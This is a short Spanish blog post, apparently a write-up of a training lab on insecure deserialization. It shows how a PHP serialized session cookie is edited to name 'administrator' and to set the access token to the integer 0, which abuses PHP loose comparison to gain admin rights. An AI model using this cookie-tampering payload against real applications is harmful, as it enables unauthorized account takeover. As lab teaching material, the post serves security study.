
---
layout: post
author: kryraj
---

¡Segundo laboratorio de insecure deserialization! Llamado "Lab: Modifying serialized data types"
Tenemos credenciales wiener:peter y nuestro objetivo es ser administradores y eliminar a carlos.

Bien, iré directamente a la solución y a explicarla. 

Cuando inicies sesión y veas la cookie, intenta modificarla hasta este punto.

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"khld9vnin7llj77yjhp60yxeq7y5k8z5";}
```

Existe la siguiente vulnerabilidad: Compara el valor con el primer valor; si son correctos, veamos el siguiente ejemplo.

```
5 == "5 de prueba"
```

Para PHP sería esto.

```
5=5
```

Ahora bien, en PHP 7.x trata la cadena como si fuese un entero.

```
0 == "test"
```

Así que podríamos intentar hacer lo siguiente. 

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
Completando el laboratorio. 
